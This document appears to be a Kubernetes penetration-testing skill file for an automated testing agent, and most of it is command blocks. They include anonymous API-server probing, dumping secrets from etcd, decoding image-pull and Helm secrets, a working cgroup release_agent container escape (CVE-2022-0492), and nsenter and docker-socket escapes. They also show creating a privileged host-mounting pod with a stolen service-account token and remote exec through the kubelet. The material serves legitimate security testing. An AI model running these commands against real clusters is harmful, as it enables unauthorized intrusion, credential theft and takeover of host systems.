---
name: kubernetes
description: Kubernetes security testing covering RBAC misconfig, container escape, secret exposure, network policy gaps, and service account abuse
mitre_techniques: [T1611, T1613, T1525]
kill_chain_phases: [privilege_escalation, discovery]
---

# Kubernetes Security Testing

Security testing methodology for Kubernetes clusters. Focus on exposed dashboards, RBAC misconfiguration, unencrypted secrets, container escapes, service account token abuse, and network policy gaps.

## Attack Surface

**Control Plane** - API server (6443), etcd (2379/2380), scheduler, controller-manager
**Node Components** - Kubelet API (10250/10255), kube-proxy, container runtime
**Workloads** - Pods, deployments, jobs, cron jobs, daemonsets
**Configuration** - RBAC, network policies, pod security standards, secrets, configmaps
**Supply Chain** - Container images, Helm charts, admission controllers

## Exposed Dashboards & API Server

```bash
# Kubernetes Dashboard (often exposed without auth)
curl -sk https://target.com:8443/
curl -sk https://target.com/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/

# API server direct access
curl -sk https://target.com:6443/api/v1/namespaces
curl -sk https://target.com:6443/version
curl -sk https://target.com:6443/apis

# Anonymous authentication check
curl -sk https://target.com:6443/api/v1/pods
curl -sk https://target.com:6443/api/v1/secrets
curl -sk https://target.com:6443/api/v1/namespaces/default/pods

# Check if system:anonymous or system:unauthenticated has permissions
kubectl auth can-i --list --as=system:anonymous
kubectl auth can-i --list --as=system:unauthenticated
```

## RBAC Misconfiguration

```bash
# Check for overly permissive cluster-admin bindings
kubectl get clusterrolebindings -o json | python3 -c "
import sys,json
data=json.load(sys.stdin)
for b in data['items']:
  role=b.get('roleRef',{}).get('name','')
  if role=='cluster-admin':
    subjects=b.get('subjects',[])
    for s in subjects:
      print(f'cluster-admin bound to: {s.get(\"kind\")}/{s.get(\"name\")} in {s.get(\"namespace\",\"cluster-wide\")}')"

# Check what the current service account can do
kubectl auth can-i --list
kubectl auth can-i create pods
kubectl auth can-i get secrets
kubectl auth can-i create clusterrolebindings

# Check for wildcard permissions
kubectl get clusterroles -o json | python3 -c "
import sys,json
data=json.load(sys.stdin)
for r in data['items']:
  for rule in r.get('rules',[]):
    if '*' in rule.get('verbs',[]) or '*' in rule.get('resources',[]):
      print(f'{r[\"metadata\"][\"name\"]}: verbs={rule.get(\"verbs\")} resources={rule.get(\"resources\")}')"

# Enumerate service accounts across namespaces
kubectl get serviceaccounts --all-namespaces -o custom-columns=NAMESPACE:.metadata.namespace,NAME:.metadata.name
```

## Secrets in etcd

```bash
# If etcd is exposed (port 2379)
etcdctl --endpoints=https://target.com:2379 get / --prefix --keys-only
etcdctl --endpoints=https://target.com:2379 get /registry/secrets --prefix

# Check if secrets are encrypted at rest
kubectl get pods -n kube-system -l component=kube-apiserver -o yaml | grep -A5 encryption-provider

# Enumerate all secrets
kubectl get secrets --all-namespaces
kubectl get secrets -n default -o yaml
# Decode secret values
kubectl get secret SECRET_NAME -o jsonpath='{.data}' | python3 -c "import sys,json,base64; d=json.loads(sys.stdin.read()); [print(f'{k}: {base64.b64decode(v).decode()}') for k,v in d.items()]"
```

## Container Escape Techniques

```bash
# Check if running as privileged
cat /proc/1/status | grep -i cap
# CapEff: 0000003fffffffff = privileged container

# Privileged container -> host filesystem access
mount /dev/sda1 /mnt 2>/dev/null && ls /mnt/etc/shadow

# Check for docker socket mount
ls -la /var/run/docker.sock
# If accessible: run container on host network with host PID namespace
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json

# hostPID namespace escape
# If hostPID=true, can see host processes
ls /proc/1/root/etc/shadow
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# Check for SYS_PTRACE capability
capsh --print | grep sys_ptrace
# Can inject into host processes if hostPID is also enabled

# cgroup escape (CVE-2022-0492)
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd && echo 'id > /output' >> /cmd && chmod +x /cmd
sh -c "echo 0 > /tmp/cgrp/x/cgroup.procs"
```

## Service Account Token Abuse

```bash
# Default token location inside pod
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
API_SERVER=https://kubernetes.default.svc

# Use token to query API server
curl -sk -H "Authorization: Bearer $TOKEN" $API_SERVER/api/v1/namespaces/$NAMESPACE/pods
curl -sk -H "Authorization: Bearer $TOKEN" $API_SERVER/api/v1/namespaces/$NAMESPACE/secrets
curl -sk -H "Authorization: Bearer $TOKEN" $API_SERVER/apis/batch/v1/namespaces/$NAMESPACE/jobs

# Create a privileged pod for escape
curl -sk -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  $API_SERVER/api/v1/namespaces/$NAMESPACE/pods -d '{
  "apiVersion":"v1","kind":"Pod","metadata":{"name":"pentest"},
  "spec":{"containers":[{"name":"pwn","image":"alpine","command":["sleep","3600"],
  "securityContext":{"privileged":true},
  "volumeMounts":[{"mountPath":"/host","name":"host"}]}],
  "volumes":[{"name":"host","hostPath":{"path":"/"}}]}}'
```

## Pod Security Bypass

```bash
# Check pod security admission (PSA) or legacy PSP
kubectl get podsecuritypolicies 2>/dev/null
kubectl get ns --show-labels | grep pod-security

# Test if privileged pods can be created
kubectl run test --image=alpine --restart=Never --overrides='{
  "spec":{"containers":[{"name":"test","image":"alpine","command":["sleep","3600"],
  "securityContext":{"privileged":true}}]}}'

# Test host namespace access
kubectl run test --image=alpine --restart=Never --overrides='{
  "spec":{"hostNetwork":true,"hostPID":true,"hostIPC":true,
  "containers":[{"name":"test","image":"alpine","command":["sleep","3600"]}]}}'
```

## Network Policy Gaps

```bash
# Check if network policies exist
kubectl get networkpolicies --all-namespaces
# No policies = all traffic allowed between pods

# Test cross-namespace communication
kubectl exec -it POD -- curl -s http://SERVICE.OTHER_NAMESPACE.svc.cluster.local

# Test egress to metadata endpoint from pod
kubectl exec -it POD -- curl -s http://169.254.169.254/latest/meta-data/

# DNS-based service discovery (often unrestricted even with netpol)
kubectl exec -it POD -- nslookup kubernetes.default.svc.cluster.local
kubectl exec -it POD -- nslookup *.*.svc.cluster.local
```

## Kubelet API Access

```bash
# Read-only kubelet (deprecated but still found - port 10255)
curl -s http://NODE_IP:10255/pods | python3 -m json.tool | head -50
curl -s http://NODE_IP:10255/metrics

# Authenticated kubelet (port 10250)
curl -sk https://NODE_IP:10250/pods
# If anonymous auth is enabled:
curl -sk https://NODE_IP:10250/run/NAMESPACE/POD/CONTAINER -X POST -d "cmd=id"
curl -sk https://NODE_IP:10250/exec/NAMESPACE/POD/CONTAINER?command=id&input=1&output=1&tty=1
```

## Image Pull Secrets & Helm

```bash
# Extract image pull secrets (registry credentials)
kubectl get secrets --all-namespaces -o json | python3 -c "
import sys,json,base64
data=json.load(sys.stdin)
for s in data['items']:
  if s['type']=='kubernetes.io/dockerconfigjson':
    decoded=base64.b64decode(s['data']['.dockerconfigjson']).decode()
    print(f'{s[\"metadata\"][\"namespace\"]}/{s[\"metadata\"][\"name\"]}: {decoded}')"

# Helm release secrets (contain full chart values including secrets)
kubectl get secrets -l owner=helm --all-namespaces
kubectl get secret RELEASE_NAME -o jsonpath='{.data.release}' | base64 -d | base64 -d | gzip -d
```

## Tools

```bash
# kube-hunter - automated penetration testing
kube-hunter --remote TARGET_IP
kube-hunter --pod  # run from inside a pod

# kubeaudit - cluster configuration audit
kubeaudit all

# trivy - scan running cluster
trivy k8s --report summary cluster

# kubectl-who-can
kubectl-who-can get secrets --all-namespaces
```

## Testing Methodology

1. **External exposure** - Scan for exposed API servers, dashboards, kubelet, etcd
2. **Authentication** - Test anonymous access, default tokens, leaked kubeconfigs
3. **RBAC audit** - Map all bindings, identify overly permissive roles and wildcard permissions
4. **Secret enumeration** - List all secrets, check encryption at rest, decode values
5. **Pod security** - Test if privileged pods can be created, check host namespace access
6. **Network policies** - Verify pod-to-pod isolation, egress restrictions, metadata blocking
7. **Container escape** - Check capabilities, socket mounts, host paths, namespace sharing
8. **Service account abuse** - From compromised pod, test API access and lateral movement

## Validation

- Demonstrate unauthenticated API server or dashboard access
- Show cluster-admin bindings on non-admin service accounts
- Prove secrets readable without authorization or unencrypted in etcd
- Demonstrate container escape to host via privileged pod or socket mount
- Document network policy gaps allowing cross-namespace or metadata access
